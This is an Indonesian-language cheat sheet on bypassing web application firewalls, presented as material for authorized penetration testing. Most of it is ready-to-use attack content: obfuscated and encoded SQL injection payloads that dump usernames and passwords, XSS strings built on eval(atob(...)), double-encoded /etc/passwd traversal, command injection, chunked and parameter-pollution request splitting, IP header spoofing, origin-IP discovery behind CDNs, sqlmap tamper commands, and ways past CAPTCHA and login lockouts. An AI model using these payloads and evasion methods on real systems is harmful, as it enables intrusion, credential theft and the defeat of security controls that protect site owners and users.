# 🛡️ Teknik Bypass WAF (Web Application Firewall)

Dokumen ini berisi teknik komprehensif untuk bypass WAF selama authorized penetration testing.
Semua teknik menggunakan pendekatan dari plan: obfuscation, encoding, fragmentasi, IP rotation, header spoofing, dan browser fingerprinting bypass.

> ⚠️ **DISCLAIMER**: Teknik ini HANYA untuk authorized penetration testing. Pastikan Anda memiliki izin legal (RoE) sebelum menggunakan teknik apapun.

---

## 1. Obfuscation — Memodifikasi Payload agar Tidak Terbaca WAF

### 1.1 Case Toggling

WAF sering melakukan signature matching case-sensitive. Variasi case bisa bypass detection.

```
-- SQL Injection
SELECT → SeLeCt, sElEcT, SELECT, select
UNION → UnIoN, uNiOn
OR → oR, Or

-- XSS
<script> → <ScRiPt>, <SCRIPT>, <scRIPT>
alert → aLeRt, ALERT
onerror → OnErRoR, ONERROR

-- Contoh
' UnIoN SeLeCt username, password FrOm users --
<ScRiPt>aLeRt(document.domain)</ScRiPt>
```

### 1.2 Comment Injection

Menyisipkan komentar SQL di tengah keyword untuk memecah pattern.

```sql
-- Inline comments (MySQL)
SEL/**/ECT → SELE/*bypass*/CT
UN/**/ION → UNI/*bypass*/ON
' UNI/**/ON SEL/**/ECT 1,2,3 --

-- Version comments (MySQL specific, dieksekusi)
/*!50000SELECT*/ → akan dieksekusi di MySQL >= 5.0
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --

-- Multi-line comments
'/**/OR/**/1=1--
' UNION/**/SELECT/**/username,password/**/FROM/**/users--
```

### 1.3 String Concatenation

Memecah string menjadi bagian-bagian kecil dan menggabungkannya.

```sql
-- MySQL
CONCAT('SEL','ECT') → menghasilkan 'SELECT'
'admin' → CONCAT('adm','in')
' UNION SELECT CONCAT(username,':',password) FROM users --

-- PostgreSQL
'SEL' || 'ECT'
'admin' → 'adm' || 'in'

-- MSSQL
'SEL' + 'ECT'
'admin' → 'adm' + 'in'

-- XSS string concatenation
<img src=x onerror="al"+"ert(1)">
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>
```

### 1.4 Whitespace Substitution

Mengganti spasi dengan karakter alternatif.

```sql
-- Tab instead of space
' UNION%09SELECT%09username%09FROM%09users--

-- Newline
' UNION%0aSELECT%0ausername%0aFROM%0ausers--

-- Carriage return + newline
' UNION%0d%0aSELECT%0d%0ausername%0d%0aFROM%0d%0ausers--

-- Parentheses (no space needed)
'UNION(SELECT(username)FROM(users))--

-- Plus sign (URL)
'+UNION+SELECT+username+FROM+users--
```

---

## 2. Encoding Payload — Base64, URL, Hexadecimal, Unicode

### 2.1 URL Encoding (Single)

```
< → %3C
> → %3E
' → %27
" → %22
/ → %2F
\ → %5C
( → %28
) → %29
space → %20 atau +

-- Contoh SQLi
' OR 1=1 -- → %27%20OR%201%3D1%20--

-- Contoh XSS
<script>alert(1)</script> → %3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### 2.2 Double URL Encoding

Encode hasil encoding pertama lagi. Efektif jika server melakukan double-decode.

```
' → %27 → %2527
< → %3C → %253C
> → %3E → %253E
/ → %2F → %252F

-- Contoh
%2527%2520OR%25201%253D1%2520--
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### 2.3 Hexadecimal Encoding

```sql
-- MySQL hex encoding
SELECT → 0x53454C454354
'admin' → 0x61646D696E

-- XSS hex encoding
<script> → \x3cscript\x3e
alert → \x61\x6c\x65\x72\x74

-- Contoh SQLi
' UNION SELECT 0x61646D696E, 0x70617373776F7264 --
```

### 2.4 Base64 Encoding

```
-- Encode payload ke Base64
echo -n "alert(document.domain)" | base64
# YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==

-- XSS via Base64
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>

-- JavaScript execution
javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))
```

### 2.5 Unicode Encoding

```
-- Unicode escape
< → \u003c
> → \u003e
' → \u0027

-- Fullwidth Unicode (bypass beberapa WAF)
< → ＜ (U+FF1C)
> → ＞ (U+FF1E)
' → ＇ (U+FF07)

-- Overlong UTF-8
/ → %c0%af (2-byte overlong)
. → %c0%ae (2-byte overlong)
```

### 2.6 HTML Entity Encoding

```html
<!-- Named entities -->
< → &lt;
> → &gt;
' → &#39; atau &apos;
" → &quot;

<!-- Decimal entities -->
< → &#60;
> → &#62;
a → &#97;
alert → &#97;&#108;&#101;&#114;&#116;

<!-- Hex entities -->
< → &#x3c;
> → &#x3e;
a → &#x61;
alert → &#x61;&#x6c;&#x65;&#x72;&#x74;

<!-- Contoh XSS bypass -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

### 2.7 Multi-layer Encoding (Berlapis)

```
-- Layer 1: URL encode
' OR 1=1 -- → %27%20OR%201%3D1%20--

-- Layer 2: Base64 encode hasil layer 1
%27%20OR%201%3D1%20-- → (base64)

-- Layer 3: URL encode lagi

-- Tujuan: WAF hanya decode 1 layer, tapi server decode semua layer
```

---

## 3. Fragmentasi Payload — Memecah Pola agar Tidak Terdeteksi

### 3.1 HTTP Parameter Pollution (HPP)

Mengirim parameter yang sama berkali-kali. Behavior berbeda per web server.

```
# PHP: mengambil parameter terakhir
GET /page?id=1&id=2 → id = 2

# ASP.NET: menggabungkan dengan koma
GET /page?id=1&id=2 → id = 1,2

# Contoh SQLi HPP
GET /page?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/username,password/*&id=*/FROM/*&id=*/users--
```

| Web Server/Technology | Behavior |
|---|---|
| PHP/Apache | Last occurrence |
| ASP.NET/IIS | All occurrences (comma-joined) |
| JSP/Tomcat | First occurrence |
| Python/Django | Last occurrence |
| Node.js/Express | Array |

### 3.2 Chunked Transfer Encoding

Memecah request body menjadi chunks kecil sehingga WAF tidak melihat pola lengkap.

```http
POST /login HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

7
user=ad
5
min'
6
+OR+1
4
=1--
0

```

### 3.3 Multipart Payload Splitting

```http
POST /page HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="id"

1' UNION SELECT username,password FROM users--
------Boundary--
```

### 3.4 JSON/XML Payload Variation

```json
// Standard
{"username": "admin", "password": "test"}

// Unicode escape in JSON
{"username": "\u0061\u0064\u006d\u0069\u006e' OR 1=1--", "password": "test"}

// Nested JSON (jika parser tolerant)
{"username": {"$gt": ""}, "password": {"$gt": ""}}  // NoSQL injection
```

---

## 4. IP Rotation & Header Spoofing

### 4.1 Header Spoofing — Memalsukan IP Origin

Beberapa WAF mempercayai header tertentu untuk menentukan IP asli client.

```bash
# Headers untuk spoof IP
curl -H "X-Forwarded-For: 127.0.0.1" https://example.com
curl -H "X-Real-IP: 127.0.0.1" https://example.com
curl -H "X-Originating-IP: 127.0.0.1" https://example.com
curl -H "X-Client-IP: 127.0.0.1" https://example.com
curl -H "X-Remote-IP: 127.0.0.1" https://example.com
curl -H "X-Remote-Addr: 127.0.0.1" https://example.com
curl -H "X-Host: 127.0.0.1" https://example.com
curl -H "Forwarded: for=127.0.0.1" https://example.com
curl -H "True-Client-IP: 127.0.0.1" https://example.com
curl -H "CF-Connecting-IP: 127.0.0.1" https://example.com
```

### 4.2 Bypass Origin IP WAF (Direct-to-Origin)

```bash
# Cari IP asli di balik CDN/WAF
# 1. DNS history
dig example.com @8.8.8.8

# 2. Subdomain yang tidak di-proxy
dig mail.example.com
dig ftp.example.com
dig dev.example.com

# 3. SSL certificate info
echo | openssl s_client -connect <IP>:443 2>/dev/null | openssl x509 -noout -subject

# 4. Shodan
shodan search "ssl.cert.subject.CN:example.com"

# 5. Jika ditemukan IP asli, bypass WAF dengan direct request
curl -H "Host: example.com" https://<REAL_IP>/
```

### 4.3 User-Agent Rotation

```bash
# Common User-Agents
# Chrome
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Firefox
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"

# Googlebot (mungkin di-whitelist)
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

# Mobile Safari
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
```

---

## 5. Bypass Browser & TLS Fingerprinting

### 5.1 TLS Fingerprinting (JA3/JA4)

WAF modern menggunakan TLS fingerprint untuk mendeteksi tool non-browser.

```bash
# Curl default = TLS fingerprint yang dikenal sebagai non-browser
# Solusi: Gunakan tool yang meniru TLS fingerprint browser

# curl-impersonate (meniru Chrome/Firefox TLS)
curl_chrome120 https://example.com

# Python requests dengan custom TLS adapter
# Gunakan library tls-client atau curl_cffi
```

### 5.2 Browser Behavior Mimicking

```
Checklist untuk meniru perilaku browser asli:
- [ ] Send Accept header: text/html,application/xhtml+xml,...
- [ ] Send Accept-Language: en-US,en;q=0.9
- [ ] Send Accept-Encoding: gzip, deflate, br
- [ ] Send Sec-Fetch-* headers (Dest, Mode, Site, User)
- [ ] Send DNT: 1
- [ ] Send Upgrade-Insecure-Requests: 1
- [ ] Maintain cookies across requests
- [ ] Follow redirects naturally
- [ ] Add Referer header dari halaman sebelumnya
- [ ] Random delay antar request (3-10 detik)
```

### 5.3 Headless Browser untuk WAF Bypass

```bash
# Puppeteer/Playwright bisa bypass fingerprinting
# Karena menggunakan browser engine asli (Chromium)

# Tapi beberapa WAF mendeteksi headless browser via:
# - navigator.webdriver = true
# - Tidak ada plugin/extensions
# - Window size terlalu seragam
# - Execution speed terlalu cepat

# Solusi: gunakan puppeteer-extra-plugin-stealth
# atau playwright-stealth
```

---

## 6. WAF-Specific Bypass Tips

### 6.1 Cloudflare

```bash
# Cari origin IP (bypass Cloudflare proxy)
# - DNS history
# - Subdomain enumeration
# - Email headers (server outgoing)
# - Shodan ssl cert search

# Request langsung ke origin IP
curl -H "Host: example.com" https://<ORIGIN_IP>/payload

# Cloudflare biasanya block common tool User-Agents
# Gunakan browser User-Agent
```

### 6.2 AWS WAF

```bash
# AWS WAF uses regex rules
# Bypass dengan encoding dan case variation
# Chunked transfer encoding sering efektif
# HPP juga bisa berhasil tergantung rule set
```

### 6.3 ModSecurity (OWASP CRS)

```bash
# ModSecurity CRS menggunakan scoring system
# Paranoia Level 1 (default) paling mudah di-bypass
# Paranoia Level 4 paling ketat

# Bypass umum:
# - Unicode encoding
# - Overlong UTF-8
# - HPP
# - JSON payload variation
# - Content-Type switching
```

---

## 7. SQLMap Tamper Scripts untuk WAF Bypass

```bash
# Space to comment
sqlmap -u "URL" --tamper=space2comment

# Char encoding
sqlmap -u "URL" --tamper=charencode

# Base64 encode
sqlmap -u "URL" --tamper=base64encode

# Between (replace > with BETWEEN)
sqlmap -u "URL" --tamper=between

# Random case
sqlmap -u "URL" --tamper=randomcase

# Multiple tampers (combine)
sqlmap -u "URL" --tamper=space2comment,charencode,randomcase,between

# Custom User-Agent
sqlmap -u "URL" --random-agent --tamper=space2comment

# Through proxy + tampers
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --tamper=space2comment,charencode --random-agent
```

**Daftar Tamper Scripts Berguna:**

| Tamper Script | Fungsi |
|---|---|
| `space2comment` | Ganti spasi dengan `/**/` |
| `charencode` | URL encode karakter |
| `chardoubleencode` | Double URL encode |
| `randomcase` | Random uppercase/lowercase |
| `between` | Ganti `>` dengan `NOT BETWEEN 0 AND` |
| `base64encode` | Encode payload ke Base64 |
| `equaltolike` | Ganti `=` dengan `LIKE` |
| `space2plus` | Ganti spasi dengan `+` |
| `space2randomblank` | Ganti spasi dengan random whitespace |
| `unionalltounion` | Ganti `UNION ALL` dengan `UNION` |
| `percentage` | Tambah `%` di depan setiap karakter |
| `appendnullbyte` | Tambah null byte `%00` di akhir |

---

## 8. Quick Reference — Payload Sebelum & Sesudah Bypass

| Vuln | Payload Original | Setelah Bypass |
|---|---|---|
| **SQLi** | `' OR 1=1 --` | `' oR 1=1 --` (case toggle) |
| **SQLi** | `' UNION SELECT` | `' UNI/**/ON SEL/**/ECT` (comment inject) |
| **SQLi** | `' UNION SELECT` | `'%20UNION%20SELECT` (URL encode) |
| **SQLi** | `' UNION SELECT` | `' /*!50000UNION*/ /*!50000SELECT*/` (MySQL version comment) |
| **XSS** | `<script>alert(1)</script>` | `<ScRiPt>alert(1)</ScRiPt>` (case toggle) |
| **XSS** | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>` (tag alternatif) |
| **XSS** | `alert(1)` | `eval(atob('YWxlcnQoMSk='))` (Base64) |
| **XSS** | `<script>` | `%3Cscript%3E` (URL encode) |
| **XSS** | `<script>` | `%253Cscript%253E` (double encode) |
| **LFI** | `../../etc/passwd` | `....//....//etc/passwd` (double dot) |
| **LFI** | `../../etc/passwd` | `..%2f..%2fetc%2fpasswd` (URL encode) |
| **LFI** | `../../etc/passwd` | `..%252f..%252fetc%252fpasswd` (double encode) |
| **CMDi** | `; whoami` | `%0awhoami` (newline) |
| **CMDi** | `; whoami` | `$(whoami)` (substitution) |

---

## 9. Bypass Proteksi Form Login & CAPTCHA

Form login seringkali dilindungi oleh CAPTCHA atau proteksi brute-force berbasis IP. Berikut adalah teknik bypass yang bisa dicoba:

### 9.1 CAPTCHA Bypass (Logika & Implementasi)

*   **Reusable CAPTCHA**: Backend memvalidasi kebenaran CAPTCHA tapi lupa untuk menghapus atau meng-invalidasi token tersebut setelah dipakai. **Cara test**: Tangkap request berisi CAPTCHA valid, dan lakukan replay berkali-kali menggunakan token yang sama.
*   **CAPTCHA Omission**: Backend gagal menghandle kondisi dimana parameter CAPTCHA sepenuhnya absen. **Cara test**: Hapus parameter `g-recaptcha-response` (atau parameter ekuivalen) dari body request.
*   **Empty Value CAPTCHA**: Backend hanya mengecek keberadaan parameter, tapi tidak tervalidasi dengan baik jika valuenya kosong. **Cara test**: Kirim `g-recaptcha-response=`.
*   **Content-Type Switch**: Pindah dari `application/x-www-form-urlencoded` ke `application/json` (atau sebaliknya). Parsing backend mungkin gagal pada Content-Type yang berbeda dan mengabaikan pengecekan CAPTCHA.

### 9.2 Rate Limiting & Lockout Bypass pada Form Login

*   **Header Spoofing**: Tambahkan header seperti `X-Forwarded-For: 127.0.0.1`, `X-Originating-IP: 192.168.1.100`, `Client-IP`, dll. Ubah nilai secara dinamis setiap kali me-request form login untuk memanipulasi rate limiter berbasis IP.
*   **Alternate Endpoints (Mobile/API)**: Seringkali proteksi CAPTCHA dan lockout yang kuat hanya diterapkan pada web UI utamanya (contoh: `/login`). Cari endpoint legacy atau API mobile seperti `/api/v1/auth`, `/mobile/login`, atau `/ajax/login`.
*   **Karakter Khusus pada Username**: Pada beberapa sistem, menambahkan null byte `%00`, spasi di belakang, atau variasi huruf besar/kecil (contoh: `admin `, `Admin`) dapat mem-bypass proteksi lockout per-user sementara database/ORM masih menafsirkannya sebagai username yang sama (berhasil login).
